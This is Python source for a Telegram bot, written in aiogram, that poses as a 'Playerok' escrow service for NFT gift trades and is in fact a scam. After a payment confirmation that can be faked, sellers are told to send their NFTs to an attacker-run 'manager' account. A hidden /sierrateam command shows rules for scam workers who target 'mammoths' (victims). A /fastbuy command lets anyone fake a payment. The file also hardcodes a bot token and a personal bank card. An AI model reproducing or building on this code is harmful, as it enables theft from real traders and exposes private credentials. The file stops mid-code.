import asyncio
import random
import string
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile
from aiogram.filters import Command, CommandStart

bot = Bot(token="7433834181:AAG8NnjboqrJBOvtisjoHmnt7VO7PiOJY4k")
dp = Dispatcher()

user_agreements = {}
user_languages = {}
user_balances = {}
user_deals = {}
user_requisites = {}
active_deals = {}
user_stats = {}
deal_counter = 0
ADMIN_ID = 8208815502
MANAGER_CARD = "2204 1201 3279 4013 - Maркин Ярослав"

def generate_memo():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=7))

def generate_deal_id():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))

start_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Полностью согласен", callback_data="agree")]
])

welcome_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="Продолжить", callback_data="continue")]
])

main_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🛡️ Создать сделку", callback_data="create_deal")],
    [InlineKeyboardButton(text="👤 Профиль", callback_data="profile")],
    [InlineKeyboardButton(text="💳 Реквизиты", callback_data="requisites")],
    [InlineKeyboardButton(text="🌍 Сменить язык", callback_data="change_language")],
    [InlineKeyboardButton(text="📞 Поддержка", url="https://t.me/nft_playerok")],
    [InlineKeyboardButton(text="Наш сайт", url="https://playerok.com/")]
])

deal_type_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🎁 Подарок", callback_data="deal_gift")],
    
    
    [InlineKeyboardButton(text="🔙 В меню", callback_data="back_to_menu")]
])

back_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🔙 Назад", callback_data="back_step")]
])

currency_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🇷🇺 RUB", callback_data="currency_RUB"), InlineKeyboardButton(text="🇪🇺 EUR", callback_data="currency_EUR")],
    [InlineKeyboardButton(text="🇺🇿 UZS", callback_data="currency_UZS"), InlineKeyboardButton(text="🇰🇬 KGS", callback_data="currency_KGS")],
    [InlineKeyboardButton(text="🇰🇿 KZT", callback_data="currency_KZT"), InlineKeyboardButton(text="🌟 Telegram stars", callback_data="currency_🌟 Telegram Stars")],
    [InlineKeyboardButton(text="🇺🇦 UAH", callback_data="currency_UAH"), InlineKeyboardButton(text="🇧🇾 BYN", callback_data="currency_BYN")],
    [InlineKeyboardButton(text="💰 USDT", callback_data="currency_USDT"), InlineKeyboardButton(text="💎 TON", callback_data="currency_TON")],
    [InlineKeyboardButton(text="🔙 Назад", callback_data="back_step")]
])

cancel_confirm_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Да,отменить", callback_data="confirm_cancel")],
    [InlineKeyboardButton(text="❌ Нет", callback_data="back_to_deal")]
])

profile_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="💳 Пополнить баланс", callback_data="deposit"), InlineKeyboardButton(text="💸 Вывод средств", callback_data="withdraw")],
    [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_menu")]
])

read_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Я прочитал(-а)", callback_data="read_deposit")]
])

deposit_method_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="💳 Банковская карта", callback_data="deposit_card"), InlineKeyboardButton(text="💎 TON", callback_data="deposit_ton")],
    [InlineKeyboardButton(text="🔙 Назад", callback_data="back_step")]
])

back_simple_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_requisites")]
])

requisites_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="💳 Добавить карту", callback_data="add_card")],
    [InlineKeyboardButton(text="💎 Добавить TON кошелек", callback_data="add_ton")],
    [InlineKeyboardButton(text="👀 Посмотреть реквизиты", callback_data="view_requisites")],
    [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_menu")]
])

language_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🇷🇺 Русский", callback_data="lang_ru"), InlineKeyboardButton(text="🇺🇸 English", callback_data="lang_en")],
    [InlineKeyboardButton(text="🔙 Обратно в меню", callback_data="back_to_menu")]
])

start_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ I fully agree", callback_data="agree")]
])

welcome_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="Continue", callback_data="continue")]
])

main_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🛡️ Create deal", callback_data="create_deal")],
    [InlineKeyboardButton(text="👤 Profile", callback_data="profile")],
    [InlineKeyboardButton(text="💳 Payment details", callback_data="requisites")],
    [InlineKeyboardButton(text="🌍 Change language", callback_data="change_language")],
    [InlineKeyboardButton(text="📞 Support", callback_data="support")],
    [InlineKeyboardButton(text="Our website", url="https://funpay.com/")]
])

deal_type_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🎁 Gift", callback_data="deal_gift")],
    [InlineKeyboardButton(text="🔙 To menu", callback_data="back_to_menu")]
])
    
    

back_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🔙 Back", callback_data="back_step")]
])

currency_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🇷🇺 RUB", callback_data="currency_RUB"), InlineKeyboardButton(text="🇪🇺 EUR", callback_data="currency_EUR")],
    [InlineKeyboardButton(text="🇰🇿 KZT", callback_data="currency_KZT"), InlineKeyboardButton(text="🌟 Telegram stars", callback_data="currency_🌟 Telegram Stars")],
    [InlineKeyboardButton(text="🇺🇦 UAH", callback_data="currency_UAH"), InlineKeyboardButton(text="🇧🇾 BYN", callback_data="currency_BYN")],
    [InlineKeyboardButton(text="💰 USDT", callback_data="currency_USDT"), InlineKeyboardButton(text="💎 TON", callback_data="currency_TON")],
    [InlineKeyboardButton(text="🔙 Back", callback_data="back_step")]
])

cancel_confirm_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Yes,cancel", callback_data="confirm_cancel")],
    [InlineKeyboardButton(text="❌ No", callback_data="back_to_deal")]
])

profile_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="💳 Deposit", callback_data="deposit"), InlineKeyboardButton(text="💸 Withdraw", callback_data="withdraw")],
    [InlineKeyboardButton(text="🔙 Back", callback_data="back_to_menu")]
])

read_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ I have read", callback_data="read_deposit")]
])

deposit_method_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="💳 Bank card", callback_data="deposit_card"), InlineKeyboardButton(text="💎 TON", callback_data="deposit_ton")],
    [InlineKeyboardButton(text="🔙 Back", callback_data="back_step")]
])

back_simple_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🔙 Back", callback_data="back_to_requisites")]
])

requisites_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="💳 Add card", callback_data="add_card")],
    [InlineKeyboardButton(text="💎 Add TON wallet", callback_data="add_ton")],
    [InlineKeyboardButton(text="👀 View requisites", callback_data="view_requisites")],
    [InlineKeyboardButton(text="🔙 Back", callback_data="back_to_menu")]
])

buyer_deal_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Я оплатил", callback_data="paid_confirmed")],
    [InlineKeyboardButton(text="❌ Выйти из сделки", callback_data="exit_deal")]
])

admin_payment_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Оплата получена", callback_data="admin_payment_ok")],
    [InlineKeyboardButton(text="❌ Оплата не получена", callback_data="admin_payment_fail")]
])

seller_gift_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Item sent", callback_data="item_sent")]
])

buyer_confirmation_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Да, все верно", callback_data="buyer_confirm_ok")],
    [InlineKeyboardButton(text="❌ Нет, товар не получен", callback_data="buyer_confirm_fail")]
])

sierrateam_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="Я ознакомился", callback_data="sierrateam_read")]
])

admin_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="⛔️ Забанить пользователя", callback_data="ban_user")],
    [InlineKeyboardButton(text="💸 Отправить деньги", callback_data="send_money")],
    [InlineKeyboardButton(text="✅ Установить успешные сделки", callback_data="set_successful_deals")],
    [InlineKeyboardButton(text="📊 Установить общее кол-во сделок", callback_data="set_total_deals")],
    [InlineKeyboardButton(text="💰 Установить оборот", callback_data="set_turnover")],
    [InlineKeyboardButton(text="🔙 Главное меню", callback_data="back_to_menu")]
])

banned_users = set()
admin_states = {}

bot_username = None

async def get_bot_username():
    global bot_username
    if bot_username is None:
        me = await bot.get_me()
        bot_username = me.username
    return bot_username

async def send_main_menu(chat_id, lang, message_id=None):
    keyboard = main_keyboard_ru if lang == "ru" else main_keyboard_en
    try:
        photo = "https://i.postimg.cc/8P1ySbyM/og-playerok.png"
        if lang == "ru":
            text = ("🛡️ Playerok Bot | OTC\n\n"
                    "Безопасный и удобный сервис для сделок!\n\n"
                    "Наши преимущества:\n"
                    "• Автоматические сделки\n"
                    "• Вывод в любой валюте\n"
                    "• Поддержка 24/7\n"
                    "• Удобный интерфейс\n\n"
                    "Выберите нужный раздел ниже:")
        else:
            text = ("🛡️ Playerok Bot | OTC\n\n"
                    "Safe and convenient service for deals!\n\n"
                    "Our advantages:\n"
                    "• Automatic deals\n"
                    "• Withdrawal in any currency\n"
                    "• 24/7 support\n"
                    "• User-friendly interface\n\n"
                    "Choose the desired section below:")
        
        if message_id:
            try:
                await bot.delete_message(chat_id, message_id)
            except:
                pass
        await bot.send_photo(chat_id, photo, caption=text, reply_markup=keyboard)
    except:
        if lang == "ru":
            text = ("🛡️ Playerok Bot | OTC\n\n"
                    "Безопасный и удобный сервис для сделок!\n\n"
                    "Наши преимущества:\n"
                    "• Автоматические сделки\n"
                    "• Вывод в любой валюте\n"
                    "• Поддержка 24/7\n"
                    "• Удобный интерфейс\n\n"
                    "Выберите нужный раздел ниже:")
        else:
            text = ("🛡️ Playerok Bot | OTC\n\n"
                    "Safe and convenient service for deals!\n\n"
                    "Our advantages:\n"
                    "• Automatic deals\n"
                    "• Withdrawal in any currency\n"
                    "• 24/7 support\n"
                    "• User-friendly interface\n\n"
                    "Choose the desired section below:")
        
        if message_id:
            try:
                await bot.delete_message(chat_id, message_id)
            except:
                pass
        await bot.send_message(chat_id, text, reply_markup=keyboard)

async def safe_edit_message(callback: CallbackQuery, text: str, reply_markup: InlineKeyboardMarkup = None):
    try:
        await callback.message.edit_text(text, reply_markup=reply_markup)
    except:
        try:
            await callback.message.delete()
        except:
            pass
        await callback.message.answer(text, reply_markup=reply_markup)

async def handle_deal_join(message: Message, deal_id: str):
    if deal_id in active_deals:
        deal = active_deals[deal_id]
        buyer_id = message.from_user.id
        buyer_username = message.from_user.username or "Не указан"
        
        if deal["buyer_id"] is None:
            deal["buyer_id"] = buyer_id
            deal["buyer_username"] = buyer_username
            deal["status"] = "active"
            
            deal_type_ru = {"deal_gift": "Подарок", "deal_account": "Аккаунт", "deal_other": "Другое"}.get(deal["type"], "Другое")
            
            payment_text = ""
            if deal["currency"] == "RUB":
                payment_text = f"💳 Оплата производится переводом на карту менеджера:\n{MANAGER_CARD}\n\nПосле перевода нажмите кнопку «✅ Я оплатил»"
            else:
                payment_text = f"🏦 Способ оплаты: {deal['currency']}\n\nПосле оплаты нажмите кнопку «✅ Я оплатил»"
            
            await message.answer(
                f"💳 Информация о сделке #{deal_id}\n\n"
                f"👤 Вы покупатель в сделке.\n"
                f"📌 Продавец: @{deal['seller_username']} ({deal['seller_id']})\n"
                f"• Успешные сделки: (0,)\n\n"
                f"• Вы покупаете: {deal['description']}\n"
                f"🎁 Тип: {deal_type_ru}\n\n"
                f"{payment_text}\n\n"
                f"💰 Сумма к оплате: {deal['amount']} {deal['currency']}",
                reply_markup=buyer_deal_keyboard
            )
            
            seller_lang = user_languages.get(deal["seller_id"], "ru")
            if seller_lang == "ru":
                deal_type_text = {"deal_gift": "gift", "deal_account": "account", "deal_other": "other"}.get(deal["type"], "other")
                await bot.send_message(
                    deal["seller_id"],
                    f"Пользователь @{buyer_username} ({buyer_id}) присоединился к сделке #{deal_id}\n"
                    f"• Успешные сделки: 0\n"
                    f"• Тип сделки: {deal_type_text}\n"
                    f"⚠️ Проверьте, что это тот же пользователь, с которым вы вели диалог ранее!"
                )
            else:
                deal_type_text = {"deal_gift": "gift", "deal_account": "account", "deal_other": "other"}.get(deal["type"], "other")
                await bot.send_message(
                    deal["seller_id"],
                    f"User @{buyer_username} ({buyer_id}) joined the deal #{deal_id}\n"
                    f"• Successful deals: 0\n"
                    f"• Deal type: {deal_type_text}\n"
                    f"⚠️ Make sure this is the same user you were chatting with before!"
                )
        else:
            await message.answer("❌ Эта сделка уже занята другим покупателем")
    else:
        await message.answer("❌ Сделка не найдена или была отменена")

@dp.message(CommandStart())
async def start_command(message: Message):
    user_id = message.from_user.id
    
    if user_id in banned_users:
        await message.answer("❌ Вы были заблокированы в боте")
        return
    
    lang = user_languages.get(user_id, "ru")
    
    args = message.text.split()
    if len(args) > 1:
        param = args[1]
        if param.startswith('deal_'):
            deal_id = param.replace('deal_', '')
            await handle_deal_join(message, deal_id)
            return
    
    if user_id in user_agreements and user_agreements[user_id]:
        await send_main_menu(message.chat.id, lang)
    else:
        if lang == "ru":
            await message.answer(
                "Вы подтверждаете, что ознакомились и согласны с <<Условиями предоставления услуг Гарант сервиса?>>\n\n"
                "Подробнее: https://telegra.ph/Ispolzuya-Nash-servis-Vy-soglashaetes-s-01-02-2",
                reply_markup=start_keyboard_ru
            )
        else:
            await message.answer(
                "Do you confirm that you have read and agree with the <<Terms of Service of the Guarantee Service?>>\n\n"
                "More details: https://telegra.ph/Ispolzuya-Nash-servis-Vy-soglashaetes-s-01-02-2",
                reply_markup=start_keyboard_en
            )

@dp.callback_query(F.data == "paid_confirmed")
async def paid_confirmed_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы были заблокированы в боте", show_alert=True)
        return
        
    deal_id = None
    for did, deal in active_deals.items():
        if deal["buyer_id"] == callback.from_user.id and deal["status"] == "active":
            deal_id = did
            break
    
    if deal_id:
        deal = active_deals[deal_id]
        await callback.message.edit_text("✅ Оплата подтверждена, ждем пока бот проверит оплату")
        
        await bot.send_message(
            ADMIN_ID,
            f"🧾 Покупатель подтвердил оплату сделки #{deal_id}\n\n"
            f"Сумма к оплате: {deal['amount']} {deal['currency']}",
            reply_markup=admin_payment_keyboard
        )
        
        active_deals[deal_id]["admin_message_id"] = callback.message.message_id
        active_deals[deal_id]["status"] = "waiting_admin"

@dp.callback_query(F.data == "admin_payment_ok")
async def admin_payment_ok_callback(callback: CallbackQuery):
    deal_id = None
    for did, deal in active_deals.items():
        if deal.get("admin_message_id") and deal["status"] == "waiting_admin":
            deal_id = did
            break
    
    if deal_id:
        deal = active_deals[deal_id]
        deal["status"] = "payment_confirmed"
        
        seller_lang = user_languages.get(deal["seller_id"], "ru")
        if deal["type"] == "deal_gift":
            text_ru = (
                f"✅ Оплата подтверждена для сделки #{deal_id}\n\n"
                f"📜 Предмет: {deal['description']}\n\n"
                f"NFT ожидает отправки на официальный аккаунт менеджера - @NFT_Playerok\n\n"
                f"⚠️ Обратите внимание:\n"
                f"➤ Подарок необходимо передать именно менеджеру, а не покупателю напрямую.\n"
                f"➤ Это стандартный процесс для автоматического завершения сделки через бота.\n\n"
                f"После отправки средства будут зачислены на ваш счёт.\n\n"
                f"⚠️ Важно:\n"
                f"Проверяйте аккаунт перед тем как передать NFT, в случае передачи на фейк аккаунт мы не сможем вам компенсировать ущерб."
            )

            text_en = (
                f"✅ Payment confirmed for deal #{deal_id}\n\n"
                f"📜 Item: {deal['description']}\n\n"
                f"NFT must be sent to the official manager account — @NFT_Playerok\n\n"
                f"⚠️ Attention:\n"
                f"➤ The gift must be sent ONLY to the manager, not to the buyer.\n"
                f"➤ This is a standard process for automatic deal completion via the bot.\n\n"
                f"After sending, the funds will be credited to your balance.\n\n"
                f"⚠️ Important:\n"
                f"Please verify the account before sending the NFT. If you send it to a fake account, we cannot compensate your loss."
            )

            seller_lang = user_languages.get(deal["seller_id"], "ru")
            text = text_en if seller_lang == "en" else text_ru

            await bot.send_message(
                deal["seller_id"],
                text,
                reply_markup=seller_gift_keyboard
            )
        else:
            await bot.send_message(
                deal["seller_id"],
                "✅ Payment received. Please send the item to the buyer.",
                reply_markup=seller_gift_keyboard
            )


@dp.callback_query(F.data == "item_sent")
async def item_sent_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы были заблокированы в боте", show_alert=True)
        return
        
    deal_id = None
    for did, deal in active_deals.items():
        if deal["seller_id"] == callback.from_user.id and deal["status"] == "payment_confirmed":
            deal_id = did
            break
    
    if deal_id:
        deal = active_deals[deal_id]
        deal["status"] = "item_sent"
        
        await bot.send_message(
            deal["buyer_id"],
            "🔔 Продавец подтвердил передачу товара",
            reply_markup=buyer_confirmation_keyboard
        )
        
        await callback.message.edit_text("✅ Вы подтвердили отправку товара. Ожидаем подтверждения от покупателя.")

@dp.callback_query(F.data == "buyer_confirm_ok")
async def buyer_confirm_ok_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы были заблокированы в боте", show_alert=True)
        return
        
    deal_id = None
    for did, deal in active_deals.items():
        if deal["buyer_id"] == callback.from_user.id and deal["status"] == "item_sent":
            deal_id = did
            break
    
    if deal_id:
        deal = active_deals[deal_id]
        deal["status"] = "completed"
        
        success_message = "🎉 Сделка состоялась успешно!"
        await callback.message.edit_text(success_message)
        await bot.send_message(deal["seller_id"], success_message)
        
        del active_deals[deal_id]

@dp.callback_query(F.data == "buyer_confirm_fail")
async def buyer_confirm_fail_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы были заблокированы в боте", show_alert=True)
        return
        
    deal_id = None
    for did, deal in active_deals.items():
        if deal["buyer_id"] == callback.from_user.id and deal["status"] == "item_sent":
            deal_id = did
            break
    
    if deal_id:
        deal = active_deals[deal_id]
        await callback.message.edit_text("❌ Вы сообщили о проблеме с получением товара. Свяжитесь с поддержкой.")
        await bot.send_message(deal["seller_id"], "❌ Покупатель сообщил о проблеме с получением товара. Свяжитесь с поддержкой.")

@dp.message(Command("sierrateam"))
async def sierrateam_command(message: Message):
    user_id = message.from_user.id
    if user_id in banned_users:
        await message.answer("❌ Вы были заблокированы в боте")
        return
        
    await message.answer(
        "Прежде чем начать воркать через бота - прочитай правила:\n\n"
        "1. Наебал на нфт - ЕСЛИ ТЫ НАПИСАЛ МАМОНТУ КИНУТЬ ГИФТ ТЕБЕ А НЕ МЕНЕДЖЕРУ - БАН. (Если мамонт кинул нфт тебе сам, либо 40% в течении дня, либо кидаешь гифт на акк менеджеру, либо бан.\n\n"
        "2. Наебал на брейнрота - 40% от стоимости в течении дня, иначе бан\n\n"
        "3. Не прочитал правила - твои проблемы",
        reply_markup=sierrateam_keyboard
    )

@dp.callback_query(F.data == "sierrateam_read")
async def sierrateam_read_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы были заблокированы в боте", show_alert=True)
        return
        
    await safe_edit_message(
        callback,
        "👑 Админ-панель\n\nВыберите действие:\n\n🔓 Полный доступ: ❌ Отсутствует\n💼 Может подтверждать: Только подарки\n\n💎 Для получения полного доступа свяжитесь с @NFT_Playerok",
        reply_markup=admin_keyboard
    )

@dp.callback_query(F.data == "ban_user")
async def ban_user_callback(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("❌ У вас нет доступа к этой функции", show_alert=True)
        return
        
    admin_states[callback.from_user.id] = "waiting_ban_id"
    await safe_edit_message(callback, "Введите ID пользователя для блокировки:")

@dp.callback_query(F.data == "send_money")
async def send_money_callback(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("❌ У вас нет доступа к этой функции", show_alert=True)
        return
        
    admin_states[callback.from_user.id] = "waiting_send_money"
    await safe_edit_message(callback, "Введите ID пользователя и сумму для перевода в формате: ID СУММА")

@dp.callback_query(F.data == "set_successful_deals")
async def set_successful_deals_callback(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("❌ У вас нет доступа к этой функции", show_alert=True)
        return
        
    admin_states[callback.from_user.id] = "waiting_successful_deals"
    await safe_edit_message(callback, "Введите ID пользователя и количество успешных сделок в формате: ID КОЛИЧЕСТВО")

@dp.callback_query(F.data == "set_total_deals")
async def set_total_deals_callback(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("❌ У вас нет доступа к этой функции", show_alert=True)
        return
        
    admin_states[callback.from_user.id] = "waiting_total_deals"
    await safe_edit_message(callback, "Введите ID пользователя и общее количество сделок в формате: ID КОЛИЧЕСТВО")

@dp.callback_query(F.data == "set_turnover")
async def set_turnover_callback(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("❌ У вас нет доступа к этой функции", show_alert=True)
        return
        
    admin_states[callback.from_user.id] = "waiting_turnover"
    await safe_edit_message(callback, "Введите ID пользователя и оборот в формате: ID СУММА")

@dp.message(Command("fastbuy"))
async def fastbuy_command(message: Message):
    # УБРАЛИ ПРОВЕРКУ НА АДМИНА - ТЕПЕРЬ ДОСТУПНО ВСЕМ
    
    try:
        # Разбиваем сообщение по пробелам и берем второй элемент (ID сделки)
        # Пример: "/fastbuy abc12345" -> deal_id станет "abc12345"
        deal_id = message.text.split()[1]
    except IndexError:
        await message.answer("⚠️ Используйте формат: `/fastbuy [ID сделки]`")
        return

    # Проверяем, существует ли такая сделка в памяти бота
    if deal_id not in active_deals:
        await message.answer(f"❌ Сделка `{deal_id}` не найдена. Возможно, бот был перезагружен или ID неверный.")
        return

    deal = active_deals[deal_id]
    
    # Меняем статус сделки внутри бота
    deal["status"] = "payment_confirmed"
    
    # Определяем язык продавца
    seller_lang = user_languages.get(deal["seller_id"], "ru")
    
    # Текст уведомления для продавца
    if deal["type"] == "deal_gift":
        text_ru = (
            f"✅ Оплата подтверждена для сделки #{deal_id}\n\n"
            f"📜 Предмет: {deal['description']}\n\n"
            f"NFT ожидает отправки на официальный аккаунт менеджера - @NFT_Playerok\n\n"
            f"⚠️ ВАЖНО:\n"
            f"➤ Подарок необходимо передать менеджеру.\n"
            f"➤ Средства будут зачислены после проверки."
        )
        text_en = (
            f"✅ Payment confirmed for deal #{deal_id}\n\n"
            f"📜 Item: {deal['description']}\n"
            f"NFT must be sent to the official manager account — @NFT_Playerok"
        )
        text = text_en if seller_lang == "en" else text_ru
    else:
        text = "✅ Оплата получена. Пожалуйста, отправьте товар покупателю."

    # Отправляем сообщение продавцу
    try:
        await bot.send_message(
            deal["seller_id"],
            text,
            reply_markup=seller_gift_keyboard
        )
        await message.answer(f"✅ Готово! Продавец получил уведомление об оплате сделки #{deal_id}")
    except Exception as e:
        await message.answer(f"❌ Ошибка при отправке уведомления продавцу: {e}")

@dp.message(F.text)
async def handle_all_messages(message: Message):
    user_id = message.from_user.id
    
    if user_id in banned_users:
        await message.answer("❌ Вы были заблокированы в боте")
        return

    if user_id == ADMIN_ID and user_id in admin_states:
        state = admin_states[user_id]
        text = message.text.strip()
        
        if state == "waiting_ban_id":
            if text.isdigit():
                user_to_ban = int(text)
                banned_users.add(user_to_ban)
                await message.answer("✅ Пользователь заблокирован")
                del admin_states[user_id]
            else:
                await message.answer("❌ Неверный формат ID")
                
        elif state == "waiting_send_money":
            parts = text.split()
            if len(parts) == 2:
                try:
                    target_user = int(parts[0])
                    amount = float(parts[1])
                    if target_user not in user_balances:
                        user_balances[target_user] = 0
                    user_balances[target_user] += amount
                    await message.answer(f"✅ Пользователю {target_user} начислено {amount} RUB")
                    del admin_states[user_id]
                except ValueError:
                    await message.answer("❌ Ошибка формата данных")
            else:
                await message.answer("❌ Неверный формат. Используйте: ID СУММА")
                
        elif state == "waiting_successful_deals":
            parts = text.split()
            if len(parts) == 2:
                try:
                    target_user = int(parts[0])
                    count = int(parts[1])
                    if target_user not in user_stats:
                        user_stats[target_user] = {"successful": 0, "total": 0, "turnover": 0}
                    user_stats[target_user]["successful"] = count
                    await message.answer(f"✅ Установлено {count} успешных сделок для пользователя {target_user}")
                    del admin_states[user_id]
                except ValueError:
                    await message.answer("❌ Ошибка формата данных")
            else:
                await message.answer("❌ Неверный формат. Используйте: ID КОЛИЧЕСТВО")
                
        elif state == "waiting_total_deals":
            parts = text.split()
            if len(parts) == 2:
                try:
                    target_user = int(parts[0])
                    count = int(parts[1])
                    if target_user not in user_stats:
                        user_stats[target_user] = {"successful": 0, "total": 0, "turnover": 0}
                    user_stats[target_user]["total"] = count
                    await message.answer(f"✅ Установлено {count} общих сделок для пользователя {target_user}")
                    del admin_states[user_id]
                except ValueError:
                    await message.answer("❌ Ошибка формата данных")
            else:
                await message.answer("❌ Неверный формат. Используйте: ID КОЛИЧЕСТВО")
                
        elif state == "waiting_turnover":
            parts = text.split()
            if len(parts) == 2:
                try:
                    target_user = int(parts[0])
                    amount = float(parts[1])
                    if target_user not in user_stats:
                        user_stats[target_user] = {"successful": 0, "total": 0, "turnover": 0}
                    user_stats[target_user]["turnover"] = amount
                    await message.answer(f"✅ Установлен оборот {amount} RUB для пользователя {target_user}")
                    del admin_states[user_id]
                except ValueError:
                    await message.answer("❌ Ошибка формата данных")
            else:
                await message.answer("❌ Неверный формат. Используйте: ID СУММА")
        return

    if user_id in user_deals:
        deal_data = user_deals[user_id]
        lang = user_languages.get(user_id, "ru")
        
        if deal_data.get("step") == "description":
            deal_data["description"] = message.text
            deal_data["step"] = "currency"
            
            if lang == "ru":
                await message.answer(
                    "🛡 Создание сделки\n\nВыберите валюту:",
                    reply_markup=currency_keyboard_ru
                )
            else:
                await message.answer(
                    "🛡 Creating deal\n\nChoose currency:",
                    reply_markup=currency_keyboard_en
                )
                
        elif deal_data.get("step") == "amount":
            try:
                amount = float(message.text)
                deal_data["amount"] = amount
                deal_id = generate_deal_id()
                username = await get_bot_username()
                deal_link = f"https://t.me/{username}?start=deal_{deal_id}"
                
                active_deals[deal_id] = {
                    "seller_id": user_id,
                    "seller_username": message.from_user.username or "Не указан",
                    "description": deal_data["description"],
                    "type": deal_data["type"],
                    "currency": deal_data["currency"],
                    "amount": amount,
                    "buyer_id": None,
                    "status": "created"
                }
                
                if lang == "ru":
                    keyboard = InlineKeyboardMarkup(inline_keyboard=[
                        [InlineKeyboardButton(text="❌ Отменить сделку", callback_data=f"cancel_deal_{deal_id}")]
                    ])
                    await message.answer(
                        f"✅ Сделка успешно создана!\n\n"
                        f"💰 Сумма: {deal_data['amount']} {deal_data['currency']}\n"
                        f"📜 Описание: {deal_data['description']}\n"
                        f"🔗 Ссылка для покупателя: {deal_link}\n"
                        f"🔑 ID сделки: `{deal_id}`",
                        reply_markup=keyboard
                    )
                else:
                    keyboard = InlineKeyboardMarkup(inline_keyboard=[
                        [InlineKeyboardButton(text="❌ Cancel deal", callback_data=f"cancel_deal_{deal_id}")]
                    ])
                    await message.answer(
                        f"✅ Deal successfully created!\n\n"
                        f"💰 Amount: {deal_data['amount']} {deal_data['currency']}\n"
                        f"📜 Description: {deal_data['description']}\n"
                        f"🔗 Buyer link: {deal_link}\n"
                        f"🔑 Deal ID: `{deal_id}`",
                        reply_markup=keyboard
                    )
                del user_deals[user_id]
                
            except ValueError:
                if lang == "ru":
                    await message.answer("❌ Пожалуйста, введите корректную сумму")
                else:
                    await message.answer("❌ Please enter a valid amount")
        return

    text = message.text
    if " - " in text and any(char.isdigit() for char in text):
        user_requisites[user_id] = {"card": text}
        lang = user_languages.get(user_id, "ru")
        if lang == "ru":
            await message.answer("✅ Реквизиты успешно добавлены")
        else:
            await message.answer("✅ Details successfully added")
    elif len(text) > 30:
        if user_id not in user_requisites:
            user_requisites[user_id] = {}
        user_requisites[user_id]["ton"] = text
        lang = user_languages.get(user_id, "ru")
        if lang == "ru":
            await message.answer("💎 Успешно добавлен ваш ТОН кошелек")
        else:
            await message.answer("💎 Your TON wallet successfully added")

@dp.callback_query(F.data == "agree")
async def agree_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы были заблокированы в боте", show_alert=True)
        return
        
    user_agreements[callback.from_user.id] = True
    lang = user_languages.get(callback.from_user.id, "ru")
    
    if lang == "ru":
        await safe_edit_message(
            callback,
            "Добро пожаловать в Playerok — сервис, обеспечивающий безопасность и удобство проведения сделок.\n"
            "Наш канал - https://t.me/playerok\n"
            "Поддержка - @NFT_Playerok",
            welcome_keyboard_ru
        )
    else:
        await safe_edit_message(
            callback,
            "Welcome to Playerok - a service that ensures security and convenience of transactions.\n"
            "Our channel - channel link\n"
            "Support - @NFT_Playerok",
            welcome_keyboard_en
        )

@dp.callback_query(F.data == "continue")
